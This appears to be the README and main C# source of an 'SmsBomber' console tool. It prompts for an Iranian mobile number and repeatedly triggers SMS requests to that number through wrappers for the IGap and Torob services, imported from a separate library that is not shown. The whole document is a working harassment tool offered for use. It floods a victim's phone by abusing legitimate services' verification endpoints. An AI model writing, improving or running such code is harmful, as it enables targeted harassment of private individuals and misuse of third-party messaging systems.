# SmsBomber
Sms Bomber C#


using SmsBomberDLL.IGap;
using SmsBomberDLL.Torob;



Console.Write("Enter Number (09********) : ");
string PhoneNumber = Console.ReadLine();
if (double.TryParse(PhoneNumber, out _) && PhoneNumber.Length == 11)
{
    try
    {
        Task IGapTask = new(() =>
          {
              for (int i = 0; i < 10; i++)
              {
                  IGapRequest IGap = new();
                  if (IGap.SendRequstIGap(PhoneNumber) == 200)
                  {
                      Console.WriteLine($"IGap Sms Sened Phone => {PhoneNumber}");
                      Thread.Sleep(1000);

                  }
                  else
                  {
                      break;
                  }
              }
          });

        Task TorobTask = new(() =>
        {
            for (int i = 0; i < 10; i++)
            {
                TorobRequest Torob = new();
                if (Torob.SendRequestTorob(PhoneNumber) == 200)
                {
                    Console.WriteLine($"Torob Sms Sened Phone => {PhoneNumber}");
                    Thread.Sleep(1000);
                }
                else
                {
                    break;
                }
            }
        });
        IGapTask.Start();
        IGapTask.Wait();
        TorobTask.Start();
        Task.WaitAll(IGapTask, TorobTask);
        Console.WriteLine("Good Bye...");
    }
    catch { }
}
Console.ReadKey();
